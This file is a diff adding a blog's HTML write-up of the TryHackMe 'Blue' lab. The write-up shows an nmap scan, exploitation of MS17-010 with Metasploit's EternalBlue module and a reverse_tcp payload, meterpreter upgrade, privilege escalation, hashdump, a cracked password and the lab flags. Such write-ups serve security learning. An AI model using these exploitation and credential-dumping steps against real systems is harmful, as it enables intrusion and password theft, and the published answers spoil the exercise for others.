@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/images/favicon.png" />
+
+<title>[THM] Blue&nbsp;|&nbsp;Wook&#39;s blog</title>
+<meta
+  name="title"
+  content="[THM] Blue"
+/>
+<meta
+  name="description"
+  content="How many ports are open with a port number under 1000? 3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?"
+/>
+<meta
+  name="keywords"
+  content="TryHackMe,"
+/>
+
+  <meta name="author" content="Wook Lee" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/thm-blue/">
+  <meta property="og:site_name" content="Wook&#39;s blog">
+  <meta property="og:title" content="[THM] Blue">
+  <meta property="og:description" content="How many ports are open with a port number under 1000? 3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-07-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-07-25T00:00:00+00:00">
+    <meta property="article:tag" content="TryHackMe">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[THM] Blue">
+  <meta name="twitter:description" content="How many ports are open with a port number under 1000? 3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?">
+
+
+
+
+
+  <meta itemprop="name" content="[THM] Blue">
+  <meta itemprop="description" content="How many ports are open with a port number under 1000? 3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?">
+  <meta itemprop="datePublished" content="2024-07-25T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-07-25T00:00:00+00:00">
+  <meta itemprop="wordCount" content="888">
+  <meta itemprop="keywords" content="TryHackMe">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/blog/"
+    
+    >Blog</a
+  >
+
+  <a
+    href="/photos/"
+    
+    >Photos</a
+  >
+
+
+  <a href="/index.xml">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
+      
+      <path
+        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
+      />
+    </svg>
+    RSS
+  </a>
+
+</nav>
+
+<h1>[THM] Blue</h1>
+
+
+    </header>
+    <main>
+      
+  
+    
+      
+      <p>
+        <i>
+          <time datetime="2024-07-25" pubdate>
+            2024-07-25
+          </time>
+        </i>
+      </p>
+    
+  
+  
+  <content>
+    <h4 id="how-many-ports-are-open-with-a-port-number-under-1000">How many ports are open with a port number under 1000?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>3</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nmap -sC -sV 10.10.75.102 --min-rate <span style="color:#fab387">3000</span> -p-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-25 12:11 EDT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.10.75.102
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.093s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65526</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT      STATE SERVICE            VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>135/tcp   open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp   open  microsoft-ds       Windows <span style="color:#fab387">7</span> Professional <span style="color:#fab387">7601</span> Service Pack <span style="color:#fab387">1</span> microsoft-ds <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>3389/tcp  open  ssl/ms-wbt-server?
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|   Target_Name: JON-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|   NetBIOS_Domain_Name: JON-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|   NetBIOS_Computer_Name: JON-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>|   DNS_Domain_Name: Jon-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>|   DNS_Computer_Name: Jon-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>|   Product_Version: 6.1.7601
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>|_  System_Time: 2024-07-25T16:13:32+00:00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>|_ssl-date: 2024-07-25T16:13:37+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>| ssl-cert: Subject: <span style="color:#f5e0dc">commonName</span><span style="color:#89dceb;font-weight:bold">=</span>Jon-PC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>| Not valid before: 2024-07-24T16:09:38
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>|_Not valid after:  2025-01-23T16:09:38
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>49152/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>49153/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>49154/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>49158/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>49160/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span></code></pre></div>
+<br>
+<h4 id="what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>ms17-010</code></pre>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<h4 id="start-metasploit">Start Metasploit</h4>
+<h4 id="find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code">Find the exploitation code we will run against the machine. What is the full path of the code?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>exploit/windows/smb/ms17_010_eternalblue</code></pre>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<br>
+<h4 id="show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">Show options and set the one required value. What is the name of this value? (All caps for submission)</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>RHOSTS</code></pre>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<br>
+<p>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</p>
+<p><code>set payload windows/x64/shell/reverse_tcp</code>.</p>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<br>
+<p>With that done, run the exploit!</p>
+<p>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL+Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</p>
+<br>
+<p>Successfully ran the exploit and captured the shell.
+<img src="image-4.png#center" alt="alt text"></p>
+<br>
+<h4 id="if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>post/multi/manage/shell_to_meterpreter</code></pre>
+<p>To convert a shell to Meterpreter shell in Metasploit, list all sessions by <code>sessions -l</code> and note the ID of the shell session you want to upgrade. Then upgrade the shell session to a Meterpreter session by <code>sessions -u &lt;id&gt;</code>.</p>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h4 id="select-this-use-module_path-show-options-what-option-are-we-required-to-change">Select this (use MODULE_PATH). Show options, what option are we required to change?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>SESSION</code></pre>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<h4 id="once-the-meterpreter-shell-conversion-completes-select-that-session-for-use">once the meterpreter shell conversion completes, select that session for use.</h4>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<h4 id="verify-that-we-have-escalated-to-nt-authoritysystem-run-getsystem-to-confirm-this-feel-free-to-open-a-dos-shell-via-command-shell-and-run-whoami-this-should-return-that-we-are-indeed-system-background-this-shell-afterwards-and-select-our-meterpreter-session-for-usage-again">Verify that we have escalated to NT AUTHORITY\SYSTEM. Run <code>getsystem</code> to confirm this. Feel free to open a dos shell via command <code>shell</code> and run <code>whoami</code>. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</h4>
+<br>
+<h4 id="list-all-of-the-processes-running-via-the-ps-command-just-because-we-are-system-doesnt-mean-our-process-is-find-a-process-towards-the-bottom-of-this-list-that-is-running-at-nt-authoritysystem-and-write-down-the-process-id">List all of the processes running via the <code>ps</code> command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id.</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>716</code></pre>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<br>
+<h4 id="migrate-to-this-process-using-the-migrate-process-id-command-where-the-process-id-is-the-one-you-just-wrote-down-in-the-previous-step-this-may-take-serveral-attempts-migrating-processes-is-not-very-stable-if-this-fails-you-may-need-to-re-run-the-conversion-process-or-reboot-the-machine-and-start-once-again">Migrate to this process using the <code>migrate &lt;process id&gt;</code> command where the process id is the one you just wrote down in the previous step. This may take serveral attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again.</h4>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<h4 id="within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-password-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">Within our elevated meterpreter shell, run the command <code>hashdump</code>. This will dump all of the password on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>Jon</code></pre>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<h4 id="copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">Copy this password hash to a file and research how to crack it. What is the cracked password?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>alqfna22</code></pre>
+<p><img src="image-11.png#center" alt="alt text"></p>
+<br>
+<h4 id="flag1-this-flag-can-be-found-at-the-system-root">Flag1? This flag can be found at the system root.</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>flag{access_the_machine}</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>meterpreter &gt; <span style="color:#89dceb">cd</span> ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Listing: C:<span style="color:#89b4fa">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89b4fa"></span><span style="color:#89dceb;font-weight:bold">============</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Mode              Size   Type  Last modified              Name
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>----              ----   ----  -------------              ----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2018-12-12 22:13:36 -0500  <span style="color:#f5e0dc">$Recycle</span>.Bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2009-07-14 01:08:56 -0400  Documents and Settings
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2009-07-13 23:20:08 -0400  PerfLogs
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:22:01 -0400  Program Files
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:28:38 -0400  Program Files <span style="color:#89dceb;font-weight:bold">(</span>x86<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>040777/rwxrwxrwx  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:35:57 -0400  ProgramData
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2018-12-12 22:13:22 -0500  Recovery
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>040777/rwxrwxrwx  <span style="color:#fab387">4096</span>   dir   2024-07-25 13:49:19 -0400  System Volume Information
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2018-12-12 22:13:28 -0500  Users
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>040777/rwxrwxrwx  <span style="color:#fab387">16384</span>  dir   2019-03-17 18:36:30 -0400  Windows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>100666/rw-rw-rw-  <span style="color:#fab387">24</span>     fil   2019-03-17 15:27:21 -0400  flag1.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>000000/---------  <span style="color:#fab387">0</span>      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>000000/---------  <span style="color:#fab387">0</span>      fif   1969-12-31 19:00:00 -0500  pagefile.sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>meterpreter &gt; cat flag1.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>flag<span style="color:#89dceb;font-weight:bold">{</span>access_the_machine<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h4 id="flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">Flag2? This flag can be found at the location where passwords are stored within Windows.</h4>
+<p>*Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It maybe necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>flag{sam_database_elevated_access}</code></pre>
+<p>The SAM (Security Accounts Manager) database stores hashed passwords for local user accounts. It is part of the Windows registry and is loaded into memory during the system boot process. The hashes are stored and can be accessed with tools that have sufficient privileges.</p>
+<p>Location: <code>C:\Windows\System32\config\SAM</code></p>
+<p><img src="image-12.png#center" alt="alt text"></p>
+<br>
+<h4 id="flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>flag{admin_documents_can_be_valuable}</code></pre>
+<p><img src="image-13.png#center" alt="alt text"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>meterpreter &gt; cat c:/Users/Jon/Documents/flag3.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>flag<span style="color:#89dceb;font-weight:bold">{</span>admin_documents_can_be_valuable<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+
+  </content>
+  
+  <p>
+    
+    <a href="/blog/tryhackme/">#TryHackMe</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+
+  <span>
+    
+    Made with
+    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
+  </span>
+
+
+    </footer>
+
+    
+</body>
+</html>
